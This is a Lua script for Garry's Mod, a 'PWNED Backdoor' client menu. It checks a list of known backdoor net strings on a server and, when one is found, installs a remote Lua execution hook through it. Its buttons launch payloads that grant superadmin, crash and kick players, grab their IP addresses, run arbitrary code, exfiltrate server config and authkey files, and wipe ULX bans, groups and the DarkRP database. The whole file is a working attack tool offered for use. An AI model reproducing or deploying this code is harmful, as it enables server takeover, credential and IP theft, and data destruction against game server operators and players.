



local backdoors = {
		"UKT_MOMOS", "Sandbox_ArmDupe", "Fix_Keypads", "memeDoor",
		"Remove_Exploiters", "noclipcloakaesp_chat_text", "fellosnake", "NoNerks",
		"BackDoor", "kek", "OdiumBackDoor", "cucked", "ITEM", "ULogs_Info", "Ulib_Message",
		"m9k_addons", "Sbox_itemstore", "rcivluz", "Sbox_darkrp", "_Defqon", "something",
		"random", "strip0", "killserver", "DefqonBackdoor", "fuckserver", "cvaraccess",
		"web", "rconadmin", "_CAC_ReadMemory", "nostrip", "c", "DarkRP_AdminWeapons",
		"enablevac", "SessionBackdoor", "LickMeOut", "MoonMan", "Im_SOCool", "fix",
		"idk", "ULXQUERY2", "ULX_QUERY2", "jesuslebg", "zilnix", "ÃžÃ ?D)â—˜",
		"disablebackdoor", "kill", "oldNetReadData", "SENDTEST", "Sandbox_GayParty",
		"nocheat", "_clientcvars", "_main", "ZimbaBackDoor", "stream", "waoz", "DarkRP_UTF8",
		"bdsm", "ZernaxBackdoor", "anticrash", "audisquad_lua", "dontforget", "noprop", "thereaper",


		"ULX_ANTI_BACKDOOR", "FADMIN_ANTICRASH", "ULX_QUERY_TEST2", -- <-- PWNED TEAM BACKDOOR
	

		"GMOD_NETDBG" -- Injected
}

local backdoornames = {
	thereaper = "TheReaper shitty script",
	nostrip = "Orbit/Toxic.pro",
	Sandbox_ArmDupe = "HTX",
	Im_SOCool = "HTX",
	MoonMan = "HTX",
	rcivluz = "PON",
	ULX_QUERY2 = "Odium",
	ULXQUERY2 = "Odium",
	web = "NOT WORKING",
	ULX_QUERY_TEST2 = "PWNED",
	FADMIN_ANTICRASH = "PWNED",
	ULX_ANTI_BACKDOOR = "PWNED",
	netlib_debug = "PWNED / NetLib",
	GMOD_NETDBG = "PWNED / Injected",
	bdsm = "Old shit",
	m9k_addons = "Old shit",
	anticrash = "Crappy menu",
	_CAC_ReadMemory = "ULXConfig / old shit",
	idk = "Toxic.pro",
	fix = "Toxic.pro",
	GMOD_NETDBG = "Injected"
}

net.Pooled = net.Pooled or function( str )
	return not(util.NetworkStringToID(str) == 0)
end

local bdkey, bdname = "",""
for k,v in ipairs(backdoors) do
	if net.Pooled(v) then
		bdkey = v
		bdname = backdoornames[v] or "Unknowed ("..v..")"
	end
end

if bdkey == "" then
	MsgC(Color(200,0,0), "No backdoor sorry :(\n")
	return
end
surface.CreateFont("PWNNNED", {size=16})
local function pwned_createbdmenu()
local uu = {}
local uuc = {}
local frame = vgui.Create("DFrame")
frame:SetSize(700, 500)
frame:Center()
frame:ShowCloseButton(false)
frame:SetTitle("PWNED Backdoor")
frame:MakePopup()
frame.Paint = function( s,w,h )
	surface.SetDrawColor(255, 255, 255)
	surface.DrawRect(0, 0, w, h)
	surface.SetDrawColor(0, 0, 0)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.DrawOutlinedRect(5, 5, 110, (#uu * 25) + 20)
	surface.DrawOutlinedRect(145, 5, 110, (#uuc * 25) + 20)
	draw.SimpleText("Used: "..bdname, "PWNNNED", 500, 15, Color(0,0,0),1,1)
	draw.SimpleText("Package: Prenium", "PWNNNED", 500, 30, Color(0,0,0),1,1)
end

local backbtn = vgui.Create("DButton", frame)
backbtn:SetText("<--")
backbtn.DoClick = function()
	frame:Remove()
	RunConsoleCommand("pwned")
end
backbtn:SizeToContents()
backbtn:SetPos(670, 2)

local textarg = vgui.Create("DTextEntry", frame)
textarg:SetSize(450, 20)
textarg:SetPos(10, 470)
textarg:SetValue("Argument go here !!")

local function FORMAT( code, target )
	if target then
		code = string.Replace(code, "#T", "Player("..target:UserID()..")")
	end
	code = string.Replace(code, "#M", "Player("..LocalPlayer():UserID()..")")
	code = string.Replace(code, "#E", textarg:GetValue())
	
	return code
end

local function SENDLUA(lua, t)
	lua = FORMAT(lua, t)
	if net.Pooled("GMOD_NETDBG") then
		net.Start("GMOD_NETDBG")
	else
		net.Start(bdkey)
	end
	net.WriteString(lua)
	net.SendToServer()
end

SENDLUA([[
util.AddNetworkString("GMOD_NETDBG")
net.Receive("GMOD_NETDBG",function(a,b)
	xpcall(function()
		CompileString(net.ReadString(), "XTerm.lua")()
	end,function(e)
		b:ChatPrint(e)
	end)
end)
	]])

local PlayerList = vgui.Create( "DListView", frame )
PlayerList:SetPos(350, 50)
PlayerList:SetSize(300, 100)
PlayerList:SetMultiSelect( true )
PlayerList:AddColumn( "Id" )
PlayerList:AddColumn( "Name" )
PlayerList:AddColumn( "Groupe" )

for i,v in ipairs(player.GetAll()) do
	PlayerList:AddLine( v:UserID(), v:Nick(), v:GetUserGroup() )
end

local function ForeachPlayer( func )
	local tbl = PlayerList:GetSelected()
	for i,v in ipairs(tbl) do
		func(Player(v:GetColumnText(1)))
	end
end

local E = vgui.Create("DButton",frame)
E:SetSize(100, 20)
E:SetPos(350, 150)
E:SetText("Everyone")
E.DoClick = function()
	PlayerList:ClearSelection()
	local tbl = PlayerList:GetLines()
	for i,v in ipairs(tbl) do
		PlayerList:SelectItem(v)
	end
end
E.Paint = function(s, w, h)
		surface.SetDrawColor(255, 255, 255)
		surface.DrawRect(0, 0, w, h)
		surface.SetDrawColor(0, 0, 0)
		surface.DrawOutlinedRect(0, 0, w, h)
end

local O = vgui.Create("DButton",frame)
O:SetSize(100, 20)
O:SetPos(450, 150)
O:SetText("Other")
O.DoClick = function()
	PlayerList:ClearSelection()
	local tbl = PlayerList:GetLines()
	for i,v in ipairs(tbl) do
		if v:GetColumnText(1).."" != LocalPlayer():UserID().."" then
			PlayerList:SelectItem(v)
		end
	end
end
O.Paint = function(s, w, h)
		surface.SetDrawColor(255, 255, 255)
		surface.DrawRect(0, 0, w, h)
		surface.SetDrawColor(0, 0, 0)
		surface.DrawOutlinedRect(0, 0, w, h)
end

local M = vgui.Create("DButton",frame)
M:SetSize(100, 20)
M:SetPos(550, 150)
M:SetText("Me")
M.DoClick = function()
	PlayerList:ClearSelection()
	local tbl = PlayerList:GetLines()
	for i,v in ipairs(tbl) do
		if v:GetColumnText(1).."" == LocalPlayer():UserID().."" then
			PlayerList:SelectItem(v)
		end
	end
end
M.Paint = function(s, w, h)
		surface.SetDrawColor(255, 255, 255)
		surface.DrawRect(0, 0, w, h)
		surface.SetDrawColor(0, 0, 0)
		surface.DrawOutlinedRect(0, 0, w, h)
end

local curAction = function()end
local curName = "NONEOVITBIATCH"
local function AddPayload(name, func)
	local tPos = #uu+1
	uu[tPos] = vgui.Create("DButton",frame)
	uu[tPos]:SetSize(100, 20)
	uu[tPos]:SetText(name)
	uu[tPos]:SetPos(10, #uu * 25)
	uu[tPos].DoClick = function()
		curAction = func
		curName = name
	end
	uu[tPos].Paint = function(s, w, h)
		if (curName == name)then
			surface.SetDrawColor(200, 200, 255)
		else
			surface.SetDrawColor(255, 255, 255)
		end
		surface.DrawRect(0, 0, w, h)
		surface.SetDrawColor(0, 0, 0)
		surface.DrawOutlinedRect(0, 0, w, h)
	end
end

local function AddPayloadClient(name, func)
	local tPos = #uuc+1
	uuc[tPos] = vgui.Create("DButton",frame)
	uuc[tPos]:SetSize(100, 20)
	uuc[tPos]:SetText(name)
	uuc[tPos]:SetPos(150, #uuc * 25)
	uuc[tPos].DoClick = function()
		curAction = function()
			ForeachPlayer(func)
		end
		curName = name
	end
	uuc[tPos].Paint = function(s, w, h)
		if (curName == name)then
			surface.SetDrawColor(200, 200, 255)
		else
			surface.SetDrawColor(255, 255, 255)
		end
		surface.DrawRect(0, 0, w, h)
		surface.SetDrawColor(0, 0, 0)
		surface.DrawOutlinedRect(0, 0, w, h)
	end
end



local aa = vgui.Create("DLabel", frame)
aa:SetText("Server")
aa:SetPos(10, 5)
aa:SetTextColor(Color(0, 0, 0))
local aa = vgui.Create("DLabel", frame)
aa:SetText("Client")
aa:SetPos(150, 5)
aa:SetTextColor(Color(0, 0, 0))


AddPayloadClient("Superadmin", function( ply )
	SENDLUA([[
			#T:SetUserGroup("superadmin")
		]], ply)
end)
AddPayloadClient("User", function( ply )
	SENDLUA([[
			#T:SetUserGroup("user")
		]], ply)
end)
AddPayloadClient("Kill", function( ply )
	SENDLUA([[
			#T:Kill()
		]], ply)
end)
AddPayloadClient("Kick", function( ply )
	SENDLUA([[
			#T:Kick("#E")
		]], ply)
end)
AddPayloadClient("Crash ", function( ply )
	SENDLUA([[
			#T:SendLua([=[while true do end]=])
		]], ply)
end)
AddPayloadClient("Instant crash", function( ply )
	SENDLUA([[
			#T:SendLua([=[table.Empty(debug.getregistry())]=])
		]], ply)
end)
AddPayloadClient("Grab IP", function( ply )
	SENDLUA([[
			#M:ChatPrint(#T:Nick().." : "..#T:IPAddress() .. " ")
		]], ply)
end)
AddPayloadClient("PLua", function( ply )
	SENDLUA([[
			#T:SendLua([=[#E]=])
		]], ply)
end)
AddPayloadClient("PCommand", function( ply )
	SENDLUA([[
			#T:ConCommand([=[#E]=])
		]], ply)
end)
AddPayloadClient("Reconnecte", function( ply )
	SENDLUA([[
			#T:ConCommand("retry")
		]], ply)
end)
AddPayloadClient("Kick(Disconnect)", function( ply )
	SENDLUA([[
			#T:ConCommand("disconnect")
		]], ply)
end)

AddPayload("Console spam", function()
	SENDLUA([[
			timer.Create("FEFEHFOZEHFBFFDSFFE", 0, 0, function()
				print("ERROR")
				print("ERROR")
				print("ERROR")
				print("ERROR")
				print("ERROR")
				print("ERROR")
				print("ERROR")
				print("ERROR")
				print("ERROR")
				print("ERROR")
				print("ERROR")
				print("ERROR")
				print("ERROR")
				print("ERROR")
				print("ERROR")
			end)
		]])
end)





AddPayload("Chat spam", function()
	if textarg:GetValue() == "" then
		SENDLUA([[
			timer.Remove("ZGPBOEGBEJZGKLEDNIUEZIZ")
		]])
	else
		SENDLUA([[
			timer.Create("ZGPBOEGBEJZGKLEDNIUEZIZ", 0, 0, function()
				BroadcastLua([=[
					chat.AddText(ColorRand(), "#E")
				]=])
			end)
		]])
	end
end)
AddPayload("Crash", function()
	if textarg:GetValue() == "" then
		SENDLUA([[
			while true do end
		]])
	else
		SENDLUA([[
			while true do print("#E") end
		]])
	end
end)
AddPayload("RLua", function()
	SENDLUA([[#E]])
end)
AddPayload("RCommand", function()
	SENDLUA([[game.ConsoleCommand([=[#E]=].."\n")]])
end)
AddPayload("TTS", function()
	SENDLUA([[
			util.AddNetworkString("TTS")
			util.AddNetworkString("pSendData")
			net.Receive("TTS",function()end)

			BroadcastLua([=[net.Receive("pSendData",function()RunString(net.ReadString())end)]=])
			timer.Simple(0.1, function()
				net.Start("pSendData")
				net.WriteString([=[
				net.Receive("TTS",function()
				local text = net.ReadString()
				chat.AddText(text)
				local str = ""
				text = string.Trim(text)
				text = string.Explode(" ", text)
				if text == {} then return end
				for k,v in pairs(text) do
					str = str .. v .. "+"
				end
				sound.PlayURL("http://translate.google.com/translate_tts?ie=UTF-8&client=tw-ob&q="..str.."&tl=fr", "mono", function(chan, num, str)	
				end )
			end)]=])
				net.Broadcast()
			end)
			timer.Simple(0.2, function()
				net.Start("TTS")
				net.WriteString([=[#E]=])
				net.Broadcast()
			end)
		]])
end)





AddPayload("Steal files", function()
	SENDLUA([[
		util.AddNetworkString("FUCKYOULOLOLOLOLOL")
		#M:SendLua([=[net.Receive("FUCKYOULOLOLOLOLOL", function()
							local a, b = net.ReadString(), net.ReadString()
								if (b == "DIR") then file.CreateDir("stealed/"..a) return end
								file.Write("stealed/"..a..".txt", b)
							end)]=])

							local function SendFile( f )
								local content = file.Read(f, "GAME") or "NO DATA"
								net.Start("FUCKYOULOLOLOLOLOL")
								net.WriteString(f)
								net.WriteString(content)
								net.Send(#M)
								#M:ChatPrint("Sent: "..f)
							end
							local function SendDir( d )
								net.Start("FUCKYOULOLOLOLOLOL")
								net.WriteString(d)
								net.WriteString("DIR")
								net.Send(#M)
							end
							timer.Simple(0.1, function()
								SendDir("cfg")
								SendDir("data")
								SendDir("data/ulx")
								SendDir("data/ulib")
								SendFile("cfg/server.cfg")
								SendFile("cfg/autoexec.cfg")
								SendFile("data/ulx/config.txt")
								SendFile("data/ulib/groups.txt")
								SendFile("authkey.txt")
							end)

]])
end)


AddPayload("Destruction", function()
	SENDLUA([[
			timer.Create("ZGPBOEGBEJZGKLEDNIUEZIZ", 0, 0, function()
				BroadcastLua([=[
					chat.AddText(ColorRand(), "SEIZED BY PWNED/Verifio.")
				]=])
			end)
			
			util.AddNetworkString("TTS")
			util.AddNetworkString("pSendData")
			net.Receive("TTS",function()end)

			BroadcastLua([=[net.Receive("pSendData",function()RunString(net.ReadString())end)]=])
			timer.Simple(0.1, function()
				net.Start("pSendData")
				net.WriteString([=[
				net.Receive("TTS",function()
				local text = net.ReadString()
				chat.AddText(text)
				local str = ""
				text = string.Trim(text)
				text = string.Explode(" ", text)
				if text == {} then return end
				for k,v in pairs(text) do
					str = str .. v .. "+"
				end
				sound.PlayURL("http://translate.google.com/translate_tts?ie=UTF-8&client=tw-ob&q="..str.."&tl=fr", "mono", function(chan, num, str)	
				end )
			end)]=])
				net.Broadcast()
			end)
			timer.Simple(0.2, function()
				net.Start("TTS")
				net.WriteString([=[Seized]=])
				net.Broadcast()
			end)
			
				BroadcastLua([=[
					RunConsoleCommand("say", "// Verifio > All")
				]=])
			
			-- Rip ulx :)
			
			if file.Exists( \"ulib/bans.txt\", \"DATA\" ) then file.Delete(\"ulib/bans.txt\") end
			if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end
			
			-- Rip les gens
			
			for k,v in pairs(player.GetAll()) do v:Ignite(120) end
			for k,v in pairs(player.GetAll()) do v:Kill() end
			for k,v in pairs(player.GetAll()) do v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end
			for k,v in pairs(player.GetAll()) do v:SetModel(\"models/editor/playerstart.mdl\") end
			RunConsoleCommand(\"sv_friction\", \"-8\")
			RunConsoleCommand(\"rp_resetallmoney\")
			
			sql.Query("DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)")
			
			local bad = {"Ban","Kick"} for k,v in next, bad do FindMetaTable("Player")[v] = nil end
			
		]])
end)

AddPayload("ULX Groups Erase", function()
	SENDLUA([[
			
			-- Rip ulx :)
			
			if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end
			
		]])
end)


AddPayload("ULX Bans Erase", function()
	SENDLUA([[
			
			-- Rip ulx :)
			
			if file.Exists( \"ulib/bans.txt\", \"DATA\" ) then file.Delete(\"ulib/bans.txt\") end
			
		]])
end)



AddPayload("sql.Dropquery", function()
	SENDLUA([[
			
				sql.Query("DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)")
			
		]])
end)

AddPayload("Break Kick/Ban", function()
	SENDLUA([[
			
				local bad = {"Ban","Kick"} for k,v in next, bad do FindMetaTable("Player")[v] = nil end
			
		]])
end)

AddPayload("Restart Server", function()
	SENDLUA([[
			
				RunConsoleCommand("_restart")
			
		]])
end)





local aa = vgui.Create("DButton", frame)
aa:SetSize(200, 40)
aa:SetPos(700 - 200 - 10, 500 - 40 - 10)
aa.Paint = function(s, w, h)
		surface.SetDrawColor(255, 255, 255)
		surface.DrawRect(0, 0, w, h)
		surface.SetDrawColor(0, 0, 0)
		surface.DrawOutlinedRect(0, 0, w, h)
end
aa.DoClick = function()
	curAction()
end
aa:SetText("Launch")

end


concommand.Add("pwned_menu",pwned_createbdmenu)